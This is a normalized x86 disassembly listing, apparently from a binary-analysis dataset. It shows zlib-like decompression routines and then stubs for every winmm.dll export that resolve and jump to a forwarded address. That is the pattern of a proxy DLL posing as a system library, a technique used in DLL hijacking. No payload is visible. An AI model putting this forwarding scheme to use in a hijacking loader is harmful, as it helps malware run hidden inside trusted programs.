mov eax edi
shl edx cl
mov ecx ebx
shr eax cl
cmp eax [ esp + 0x3c ]
jae r-xdata
mov edi [ esp + 0x50 ]
mov ecx eax
sub ecx ebx
mov eax 0x1
shl eax cl
cmp eax edi
jbe r-xdata
mov edx ebp
mov ecx [ esp + 0x20 ]
mov eax 0x1
shl eax cl
test edi eax
je r-xdata
mov ecx [ esp + 0x40 ]
lea ecx [ ecx + eax * 8 ]
add ebp 0x4
mov [ esp + 0x1c ] ebp
mov ebp [ esp + 0x134 ]
mov edx 0x1
shl edx cl
mov eax [ ebp ]
mov [ esp + 0x3c ] edx
add edx eax
cmp edx 0x5a0
ja r-xdata
mov ebp [ esp + 0x24 ]
or edi 0xffffffff
sub edi ebp
mov ebp [ esp + 0x28 ]
add eax edi
cmp ecx edx
jae r-xdata
mov edx [ esp + 0x18 ]
mov ebp 0x1
mov ecx ebx
xor edi eax
shl ebp cl
mov ecx [ esp + edx * 4 + 0x94 ]
lea eax [ esp + edx * 4 + 0x94 ]
mov [ esp + 0x38 ] edi
dec ebp
and ebp edi
cmp ebp ecx
je r-xdata
xor edi eax
shr eax 0x1
test edi eax
jne r-xdata
mov ebp [ esp + 0x30 ]
add eax edx
mov [ ecx ] ebp
lea ebp [ edx * 8 ]
mov [ ecx + 0x4 ] esi
add ecx ebp
cmp eax [ esp + 0x3c ]
jb r-xdata
mov edi [ esp + 0x130 ]
mov [ ebp ] edx
mov edx [ esp + 0x18 ]
lea eax [ edi + eax * 8 ]
mov edi [ esp + 0x18 ]
test edx edx
lea edi [ esp + edi * 4 + 0xd4 ]
mov [ esp + 0x40 ] eax
mov [ esp + 0x4c ] edi
mov [ edi ] eax
je r-xdata
inc ecx
cmp ecx edx
jae r-xdata
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x10 ]
mov edx eax
dec eax
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x14 ]
test edx edx
jne r-xdata
mov ebp [ esp + 0x10 ]
dec edx
sub ebx ebp
mov ebp 0x1
mov ecx ebx
sub eax 0x4
shl ebp cl
mov ecx [ eax ]
dec ebp
and ebp edi
cmp ebp ecx
jne r-xdata
mov ecx [ esp + 0x128 ]
mov edi [ esp + 0x38 ]
mov [ ecx ] eax
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x10 ]
mov esi [ esp + 0x40 ]
mov [ esp + 0x30 ] cl
mov ecx ebx
mov [ esp + edx * 4 + 0x94 ] edi
mov edx [ esp + 0x4c ]
mov [ esp + 0x31 ] al
sub ecx eax
mov eax edi
shr eax cl
mov ecx [ edx - 0x4 ]
mov edx [ esp + 0x30 ]
sub esi ecx
sar esi 0x3
sub esi eax
mov [ ecx + eax * 8 ] edx
mov [ ecx + eax * 8 + 0x4 ] esi
jmp r-xdata
mov edi [ ebp + 0x4 ]
add ebp 0x4
shl eax 0x1
cmp eax edi
jbe r-xdata
mov edx [ esp + 0x24 ]
mov [ esp + 0x18 ] edx
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x48 ]
mov eax [ esp + 0x14 ]
cmp eax ecx
jg r-xdata
sub eax edi
inc ecx
cmp ecx edx
jb r-xdata
sub_10006f40
push ecx
push ebx
mov ebx [ esp + 0x2c ]
push ebp
push esi
mov eax [ ebx + 0x28 ]
push edi
push 0x4
push 0x120
push eax
mov [ esp + 0x1c ] 0x0
call [ ebx + 0x20 ]
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x34 ]
push edx
mov edx [ esp + 0x2c ]
push eax
push ecx
push r--data
push r--data
push 0x101
push ebp
push edx
call sub_10006a80
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0xfffffffc
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov eax [ esp + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
cmp esi 0xfffffffc
je r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x28 ]
lea ecx [ esp + 0x10 ]
push edi
push ecx
mov ecx [ esp + 0x38 ]
push edx
mov edx [ esp + 0x28 ]
push eax
mov eax [ esp + 0x30 ]
push ecx
push r--data
push r--data
push esi
lea ecx [ eax + ebp * 4 ]
push edx
push ecx
call sub_10006a80
mov esi eax
add esp 0x28
test esi esi
jne r-xdata
mov edx [ ebx + 0x28 ]
push edi
push edx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp esi 0xfffffffd
jne r-xdata
mov edx [ esp + 0x28 ]
cmp [ edx ] 0x0
jne r-xdata
cmp esi 0xfffffffb
jne r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x28 ]
push edi
push eax
call [ ebx + 0x24 ]
add esp 0x8
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
cmp ebp 0x101
ja r-xdata
cmp esi 0xfffffffc
je r-xdata
mov ecx [ ebx + 0x28 ]
push edi
push ecx
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov [ ebx + 0x18 ] rw-data
mov esi 0xfffffffd
mov ecx [ ebx + 0x28 ]
push edi
push ecx
call [ ebx + 0x24 ]
add esp 0x8
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_10007100
push ecx
push ebx
mov ebx [ esp + 0xc ]
push ebp
push esi
mov esi [ esp + 0x18 ]
mov ebp [ ebx + 0x34 ]
push edi
mov edi [ ebx + 0x30 ]
mov eax [ esi + 0xc ]
cmp edi ebp
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] edi
jbe r-xdata
mov eax [ esi + 0x10 ]
sub ebp edi
cmp ebp eax
jbe r-xdata
mov ebp [ ebx + 0x2c ]
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ esi + 0x14 ]
sub eax ebp
add edx ebp
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov ecx ebp
mov esi edi
mov edi [ esp + 0x10 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov eax [ esp + 0x18 ]
mov ecx edx
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov edi [ esp + 0x10 ]
mov ecx [ ebx + 0x2c ]
add edi ebp
cmp eax ecx
mov [ esp + 0x10 ] edi
jne r-xdata
mov ecx [ ebx + 0x3c ]
push ebp
push edi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ esi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
mov ecx [ esp + 0x1c ]
mov edx [ esp + 0x10 ]
pop edi
pop esi
mov [ ecx + 0xc ] edx
mov [ ebx + 0x30 ] eax
mov eax [ esp + 0x18 ]
pop ebp
pop ebx
pop ecx
retn
mov eax [ ebx + 0x34 ]
mov esi [ ebx + 0x28 ]
cmp eax ecx
mov [ esp + 0x18 ] esi
jne r-xdata
mov edi [ esp + 0x1c ]
mov ebp [ ebx + 0x34 ]
sub ebp esi
mov eax [ edi + 0x10 ]
cmp ebp eax
jbe r-xdata
mov [ ebx + 0x34 ] esi
test ebp ebp
je r-xdata
mov ebp eax
mov edx [ edi + 0x14 ]
sub eax ebp
add edx ebp
mov [ edi + 0x10 ] eax
mov [ edi + 0x14 ] edx
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
cmp [ esp + 0x20 ] 0xfffffffb
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx ebp
mov edx ecx
mov edi eax
shr ecx 0x2
[ edi ] [ esi ]
add eax ebp
mov ecx edx
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x18 ]
and ecx 0x3
add eax ebp
[ edi ] [ esi ]
mov [ esp + 0x18 ] eax
mov ecx [ ebx + 0x3c ]
push ebp
push esi
push ecx
call eax
mov [ ebx + 0x3c ] eax
add esp 0xc
mov [ edi + 0x30 ] eax
mov [ esp + 0x20 ] 0x0
sub_10007240
sub esp 0x14
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x28 ]
push ebx
push ebp
mov ebp [ eax ]
mov eax [ eax + 0x4 ]
mov edx [ ecx + 0x20 ]
push esi
mov esi [ ecx + 0x30 ]
push edi
mov edi [ ecx + 0x34 ]
mov [ esp + 0x10 ] eax
mov eax [ ecx + 0x1c ]
cmp edi esi
mov [ esp + 0x18 ] ebp
jae r-xdata
mov ecx [ ecx + 0x2c ]
sub ecx edi
mov [ esp + 0x14 ] ecx
sub esi edi
dec esi
mov [ esp + 0x14 ] esi
jmp r-xdata
mov ecx [ esp + 0x1c ]
mov esi [ esp + 0x30 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0x14
jb r-xdata
mov ecx [ esp + 0x28 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x1c ] ecx
mov ecx [ esp + 0x2c ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp + 0x20 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov cl [ esi + 0x4 ]
mov [ edi ] cl
mov ecx [ esp + 0x14 ]
inc edi
dec ecx
mov [ esp + 0x14 ] ecx
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov [ esp + 0x18 ] ebp
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
cmp [ esp + 0x10 ] 0xa
jb r-xdata
and ebx 0xf
sub eax ebx
mov ecx [ ebx * 4 + rw-data ]
and ecx edx
add ecx [ esi + 0x4 ]
mov [ esp + 0x2c ] ecx
mov ecx ebx
shr edx cl
cmp eax 0xf
jae r-xdata
test bl 0x40
jne r-xdata
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x14
retn
mov ecx ebx
jmp r-xdata
mov ecx [ esp + 0x20 ]
mov esi [ esp + 0x34 ]
and ecx edx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
jne r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov esi ecx
mov ecx eax
shl esi cl
add eax 0x8
or edx esi
inc ebp
cmp eax 0xf
jb r-xdata
test bl 0x20
je r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
test ebx ebx
je r-xdata
cmp eax 0x14
jae r-xdata
and ebx 0xf
cmp eax ebx
jae r-xdata
test bl 0x40
jne r-xdata
mov [ esp + 0x18 ] ebp
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov esi [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov ecx [ esi + 0x4 ]
sub ecx ebx
mov ebx eax
shr ebx 0x3
cmp ebx ecx
jae r-xdata
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebp [ ebx * 4 + rw-data ]
mov ecx [ esi + 0x4 ]
mov esi [ esp + 0x14 ]
and ebp edx
add ebp ecx
mov ecx ebx
shr edx cl
mov ecx [ esp + 0x2c ]
sub eax ebx
sub esi ecx
mov [ esp + 0x14 ] esi
mov esi edi
sub esi ebp
mov ebp [ esp + 0x38 ]
mov ebx [ ebp + 0x28 ]
cmp esi ebx
jae r-xdata
mov ecx [ esp + 0x10 ]
dec ecx
mov [ esp + 0x10 ] ecx
xor ecx ecx
mov cl [ ebp ]
mov ebp ecx
mov ecx eax
shl ebp cl
add eax 0x8
or edx ebp
mov ebp [ esp + 0x18 ]
inc ebp
cmp eax ebx
mov [ esp + 0x18 ] ebp
jb r-xdata
mov ecx [ esp + 0x3c ]
mov ebx [ esp + 0x10 ]
mov esi [ ecx + 0x4 ]
mov [ ecx + 0x18 ] rw-data
sub esi ebx
mov [ esp + 0x2c ] esi
mov esi eax
mov ebx [ esp + 0x2c ]
shr esi 0x3
cmp esi ebx
jb r-xdata
mov ecx [ ebx * 4 + rw-data ]
mov ebx [ esi + 0x4 ]
and ecx edx
add ecx ebx
xor ebx ebx
mov bl [ esi + ecx * 8 ]
lea esi [ esi + ecx * 8 ]
xor ecx ecx
mov cl [ esi + 0x1 ]
shr edx cl
sub eax ecx
mov [ esp + 0x28 ] ecx
test bl 0x10
je r-xdata
mov ebx [ esp + 0x38 ]
sub ebp esi
mov [ ebx + 0x20 ] edx
lea edx [ esi * 8 ]
sub eax edx
mov edx ebp
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
add esi eax
mov eax [ ecx + 0x8 ]
mov [ ecx + 0x4 ] esi
mov esi [ ecx ]
sub edx esi
mov [ ecx ] ebp
add eax edx
mov [ ecx + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0xfffffffd
pop ebx
add esp 0x14
retn
mov esi [ esp + 0x2c ]
mov ebx [ esp + 0x38 ]
sub ebp ecx
mov [ ebx + 0x20 ] edx
lea edx [ ecx * 8 ]
sub eax edx
mov [ ebx + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov edx [ esi ]
add ecx eax
mov eax [ esi + 0x8 ]
mov [ esi + 0x4 ] ecx
mov ecx ebp
mov [ esi ] ebp
sub ecx edx
add eax ecx
mov [ esi + 0x8 ] eax
mov [ ebx + 0x34 ] edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x14
retn
mov ecx ebx
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
mov ebp [ ebp + 0x2c ]
mov [ esp + 0x28 ] ebp
sub ebp ebx
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
add esi ebp
cmp esi ebx
jb r-xdata
mov ebp [ esp + 0x28 ]
sub ebp esi
cmp ecx ebp
jbe r-xdata
cmp [ esp + 0x14 ] 0x102
jb r-xdata
mov bl [ esi ]
mov [ edi ] bl
mov bl [ esi + 0x1 ]
inc edi
inc esi
mov [ edi ] bl
inc edi
inc esi
sub ecx 0x2
sub ecx ebp
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ebp
jne r-xdata
mov esi [ esp + 0x38 ]
mov esi [ esi + 0x28 ]
mov bl [ esi ]
mov [ edi ] bl
inc edi
inc esi
dec ecx
jne r-xdata
mov ebp [ esp + 0x18 ]
jmp r-xdata
ordinal_2
push 0x2
call sub_10002e20
jmp eax
CloseDriver
push rw-data
call sub_10002e20
jmp eax
DefDriverProc
push rw-data
call sub_10002e20
jmp eax
DriverCallback
push rw-data
call sub_10002e20
jmp eax
DrvGetModuleHandle
push rw-data
call sub_10002e20
jmp eax
GetDriverModuleHandle
push rw-data
call sub_10002e20
jmp eax
MigrateAllDrivers
push rw-data
call sub_10002e20
jmp eax
MigrateSoundEvents
push rw-data
call sub_10002e20
jmp eax
NotifyCallbackData
push rw-data
call sub_10002e20
jmp eax
OpenDriver
push rw-data
call sub_10002e20
jmp eax
PlaySound
push rw-data
call sub_10002e20
jmp eax
PlaySoundA
push rw-data
call sub_10002e20
jmp eax
PlaySoundW
push rw-data
call sub_10002e20
jmp eax
SendDriverMessage
push rw-data
call sub_10002e20
jmp eax
WOW32DriverCallback
push rw-data
call sub_10002e20
jmp eax
WOW32ResolveMultiMediaHandle
push rw-data
call sub_10002e20
jmp eax
WOWAppExit
push rw-data
call sub_10002e20
jmp eax
WinmmLogoff
push rw-data
call sub_10002e20
jmp eax
WinmmLogon
push rw-data
call sub_10002e20
jmp eax
aux32Message
push rw-data
call sub_10002e20
jmp eax
auxGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
auxGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
auxGetNumDevs
push rw-data
call sub_10002e20
jmp eax
auxGetVolume
push rw-data
call sub_10002e20
jmp eax
auxOutMessage
push rw-data
call sub_10002e20
jmp eax
auxSetVolume
push rw-data
call sub_10002e20
jmp eax
gfxAddGfx
push rw-data
call sub_10002e20
jmp eax
gfxBatchChange
push rw-data
call sub_10002e20
jmp eax
gfxCreateGfxFactoriesList
push rw-data
call sub_10002e20
jmp eax
gfxCreateZoneFactoriesList
push rw-data
call sub_10002e20
jmp eax
gfxDestroyDeviceInterfaceList
push rw-data
call sub_10002e20
jmp eax
gfxEnumerateGfxs
push rw-data
call sub_10002e20
jmp eax
_gfxLogoff@0
push rw-data
call sub_10002e20
jmp eax
_gfxLogon@4
push rw-data
call sub_10002e20
jmp eax
gfxModifyGfx
push rw-data
call sub_10002e20
jmp eax
gfxOpenGfx
push rw-data
call sub_10002e20
jmp eax
gfxRemoveGfx
push rw-data
call sub_10002e20
jmp eax
joy32Message
push rw-data
call sub_10002e20
jmp eax
joyConfigChanged
push rw-data
call sub_10002e20
jmp eax
joyGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
joyGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
joyGetNumDevs
push rw-data
call sub_10002e20
jmp eax
joyGetPos
push rw-data
call sub_10002e20
jmp eax
joyGetPosEx
push rw-data
call sub_10002e20
jmp eax
joyGetThreshold
push rw-data
call sub_10002e20
jmp eax
joyReleaseCapture
push rw-data
call sub_10002e20
jmp eax
joySetCapture
push rw-data
call sub_10002e20
jmp eax
joySetThreshold
push rw-data
call sub_10002e20
jmp eax
mci32Message
push rw-data
call sub_10002e20
jmp eax
mciDriverNotify
push rw-data
call sub_10002e20
jmp eax
mciDriverYield
push rw-data
call sub_10002e20
jmp eax
mciExecute
push rw-data
call sub_10002e20
jmp eax
mciFreeCommandResource
push rw-data
call sub_10002e20
jmp eax
mciGetCreatorTask
push rw-data
call sub_10002e20
jmp eax
mciGetDeviceIDA
push rw-data
call sub_10002e20
jmp eax
mciGetDeviceIDFromElementIDA
push rw-data
call sub_10002e20
jmp eax
mciGetDeviceIDFromElementIDW
push rw-data
call sub_10002e20
jmp eax
mciGetDeviceIDW
push rw-data
call sub_10002e20
jmp eax
mciGetDriverData
push rw-data
call sub_10002e20
jmp eax
mciGetErrorStringA
push rw-data
call sub_10002e20
jmp eax
mciGetErrorStringW
push rw-data
call sub_10002e20
jmp eax
mciGetYieldProc
push rw-data
call sub_10002e20
jmp eax
mciLoadCommandResource
push rw-data
call sub_10002e20
jmp eax
mciSendCommandA
push rw-data
call sub_10002e20
jmp eax
mciSendCommandW
push rw-data
call sub_10002e20
jmp eax
mciSendStringA
push rw-data
call sub_10002e20
jmp eax
mciSendStringW
push rw-data
call sub_10002e20
jmp eax
mciSetDriverData
push rw-data
call sub_10002e20
jmp eax
mciSetYieldProc
push rw-data
call sub_10002e20
jmp eax
mid32Message
push rw-data
call sub_10002e20
jmp eax
midiConnect
push rw-data
call sub_10002e20
jmp eax
midiDisconnect
push rw-data
call sub_10002e20
jmp eax
midiInAddBuffer
push rw-data
call sub_10002e20
jmp eax
midiInClose
push rw-data
call sub_10002e20
jmp eax
midiInGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
midiInGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
midiInGetErrorTextA
push rw-data
call sub_10002e20
jmp eax
midiInGetErrorTextW
push rw-data
call sub_10002e20
jmp eax
midiInGetID
push rw-data
call sub_10002e20
jmp eax
midiInGetNumDevs
push rw-data
call sub_10002e20
jmp eax
midiInMessage
push rw-data
call sub_10002e20
jmp eax
midiInOpen
push rw-data
call sub_10002e20
jmp eax
midiInPrepareHeader
push rw-data
call sub_10002e20
jmp eax
midiInReset
push rw-data
call sub_10002e20
jmp eax
midiInStart
push rw-data
call sub_10002e20
jmp eax
midiInStop
push rw-data
call sub_10002e20
jmp eax
midiInUnprepareHeader
push rw-data
call sub_10002e20
jmp eax
midiOutCacheDrumPatches
push rw-data
call sub_10002e20
jmp eax
midiOutCachePatches
push rw-data
call sub_10002e20
jmp eax
midiOutClose
push rw-data
call sub_10002e20
jmp eax
midiOutGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
midiOutGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
midiOutGetErrorTextA
push rw-data
call sub_10002e20
jmp eax
midiOutGetErrorTextW
push rw-data
call sub_10002e20
jmp eax
midiOutGetID
push rw-data
call sub_10002e20
jmp eax
midiOutGetNumDevs
push rw-data
call sub_10002e20
jmp eax
midiOutGetVolume
push rw-data
call sub_10002e20
jmp eax
midiOutLongMsg
push rw-data
call sub_10002e20
jmp eax
midiOutMessage
push rw-data
call sub_10002e20
jmp eax
midiOutOpen
push rw-data
call sub_10002e20
jmp eax
midiOutPrepareHeader
push rw-data
call sub_10002e20
jmp eax
midiOutReset
push rw-data
call sub_10002e20
jmp eax
midiOutSetVolume
push rw-data
call sub_10002e20
jmp eax
midiOutShortMsg
push rw-data
call sub_10002e20
jmp eax
midiOutUnprepareHeader
push rw-data
call sub_10002e20
jmp eax
midiStreamClose
push rw-data
call sub_10002e20
jmp eax
midiStreamOpen
push rw-data
call sub_10002e20
jmp eax
midiStreamOut
push rw-data
call sub_10002e20
jmp eax
midiStreamPause
push rw-data
call sub_10002e20
jmp eax
midiStreamPosition
push rw-data
call sub_10002e20
jmp eax
midiStreamProperty
push rw-data
call sub_10002e20
jmp eax
midiStreamRestart
push rw-data
call sub_10002e20
jmp eax
midiStreamStop
push rw-data
call sub_10002e20
jmp eax
mixerClose
push rw-data
call sub_10002e20
jmp eax
mixerGetControlDetailsA
push rw-data
call sub_10002e20
jmp eax
mixerGetControlDetailsW
push rw-data
call sub_10002e20
jmp eax
mixerGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
mixerGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
mixerGetID
push rw-data
call sub_10002e20
jmp eax
mixerGetLineControlsA
push rw-data
call sub_10002e20
jmp eax
mixerGetLineControlsW
push rw-data
call sub_10002e20
jmp eax
mixerGetLineInfoA
push rw-data
call sub_10002e20
jmp eax
mixerGetLineInfoW
push rw-data
call sub_10002e20
jmp eax
mixerGetNumDevs
push rw-data
call sub_10002e20
jmp eax
mixerMessage
push rw-data
call sub_10002e20
jmp eax
mixerOpen
push rw-data
call sub_10002e20
jmp eax
mixerSetControlDetails
push rw-data
call sub_10002e20
jmp eax
mmDrvInstall
push rw-data
call sub_10002e20
jmp eax
mmGetCurrentTask
push rw-data
call sub_10002e20
jmp eax
mmTaskBlock
push rw-data
call sub_10002e20
jmp eax
mmTaskCreate
push rw-data
call sub_10002e20
jmp eax
mmTaskSignal
push rw-data
call sub_10002e20
jmp eax
mmTaskYield
push rw-data
call sub_10002e20
jmp eax
mmioAdvance
push rw-data
call sub_10002e20
jmp eax
mmioAscend
push rw-data
call sub_10002e20
jmp eax
mmioClose
push rw-data
call sub_10002e20
jmp eax
mmioCreateChunk
push rw-data
call sub_10002e20
jmp eax
mmioDescend
push rw-data
call sub_10002e20
jmp eax
mmioFlush
push rw-data
call sub_10002e20
jmp eax
mmioGetInfo
push rw-data
call sub_10002e20
jmp eax
mmioInstallIOProcA
push rw-data
call sub_10002e20
jmp eax
mmioInstallIOProcW
push rw-data
call sub_10002e20
jmp eax
mmioOpenA
push rw-data
call sub_10002e20
jmp eax
mmioOpenW
push rw-data
call sub_10002e20
jmp eax
mmioRead
push rw-data
call sub_10002e20
jmp eax
mmioRenameA
push rw-data
call sub_10002e20
jmp eax
mmioRenameW
push rw-data
call sub_10002e20
jmp eax
mmioSeek
push rw-data
call sub_10002e20
jmp eax
mmioSendMessage
push rw-data
call sub_10002e20
jmp eax
mmioSetBuffer
push rw-data
call sub_10002e20
jmp eax
mmioSetInfo
push rw-data
call sub_10002e20
jmp eax
mmioStringToFOURCCA
push rw-data
call sub_10002e20
jmp eax
mmioStringToFOURCCW
push rw-data
call sub_10002e20
jmp eax
mmioWrite
push rw-data
call sub_10002e20
jmp eax
mmsystemGetVersion
push rw-data
call sub_10002e20
jmp eax
mod32Message
push rw-data
call sub_10002e20
jmp eax
mxd32Message
push rw-data
call sub_10002e20
jmp eax
sndPlaySoundA
push rw-data
call sub_10002e20
jmp eax
sndPlaySoundW
push rw-data
call sub_10002e20
jmp eax
tid32Message
push rw-data
call sub_10002e20
jmp eax
timeBeginPeriod
push rw-data
call sub_10002e20
jmp eax
timeEndPeriod
push rw-data
call sub_10002e20
jmp eax
timeGetDevCaps
push rw-data
call sub_10002e20
jmp eax
timeGetSystemTime
push rw-data
call sub_10002e20
jmp eax
timeGetTime
push rw-data
call sub_10002e20
jmp eax
timeKillEvent
push rw-data
call sub_10002e20
jmp eax
timeSetEvent
push rw-data
call sub_10002e20
jmp eax
waveInAddBuffer
push rw-data
call sub_10002e20
jmp eax
waveInClose
push rw-data
call sub_10002e20
jmp eax
waveInGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
waveInGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
waveInGetErrorTextA
push rw-data
call sub_10002e20
jmp eax
waveInGetErrorTextW
push rw-data
call sub_10002e20
jmp eax
waveInGetID
push rw-data
call sub_10002e20
jmp eax
waveInGetNumDevs
push rw-data
call sub_10002e20
jmp eax
waveInGetPosition
push rw-data
call sub_10002e20
jmp eax
waveInMessage
push rw-data
call sub_10002e20
jmp eax
waveInOpen
push rw-data
call sub_10002e20
jmp eax
waveInPrepareHeader
push rw-data
call sub_10002e20
jmp eax
waveInReset
push rw-data
call sub_10002e20
jmp eax
waveInStart
push rw-data
call sub_10002e20
jmp eax
waveInStop
push rw-data
call sub_10002e20
jmp eax
waveInUnprepareHeader
push rw-data
call sub_10002e20
jmp eax
waveOutBreakLoop
push rw-data
call sub_10002e20
jmp eax
waveOutClose
push rw-data
call sub_10002e20
jmp eax
waveOutGetDevCapsA
push rw-data
call sub_10002e20
jmp eax
waveOutGetDevCapsW
push rw-data
call sub_10002e20
jmp eax
waveOutGetErrorTextA
push rw-data
call sub_10002e20
jmp eax
waveOutGetErrorTextW
push rw-data
call sub_10002e20
jmp eax
waveOutGetID
push rw-data
call sub_10002e20
jmp eax
waveOutGetNumDevs
push rw-data
call sub_10002e20
jmp eax
waveOutGetPitch
push rw-data
call sub_10002e20
jmp eax
waveOutGetPlaybackRate
push rw-data
call sub_10002e20
jmp eax
waveOutGetPosition
push rw-data
call sub_10002e20
jmp eax
waveOutGetVolume
push rw-data
call sub_10002e20
jmp eax
waveOutMessage
push rw-data
call sub_10002e20
jmp eax
waveOutOpen
push rw-data
call sub_10002e20
jmp eax
waveOutPause
push rw-data
call sub_10002e20
jmp eax
waveOutPrepareHeader
push rw-data
call sub_10002e20
jmp eax
waveOutReset
push rw-data
call sub_10002e20
jmp eax
waveOutRestart
push rw-data
call sub_10002e20
jmp eax
waveOutSetPitch
push rw-data
call sub_10002e20
jmp eax
waveOutSetPlaybackRate
push rw-data
call sub_10002e20
jmp eax
waveOutSetVolume
push rw-data
call sub_10002e20
jmp eax
waveOutUnprepareHeader
push rw-data
call sub_10002e20
jmp eax
waveOutWrite
push rw-data
call sub_10002e20
jmp eax
wid32Message
push rw-data
call sub_10002e20
jmp eax
winmmDbgOut
push rw-data
call sub_10002e20
jmp eax
winmmSetDebugLevel
push rw-data
call sub_10002e20
jmp eax
wod32Message
push rw-data
call sub_10002e20
jmp eax
memcpy
jmp [ memcpy@IAT ]
memset
jmp [ memset@IAT ]
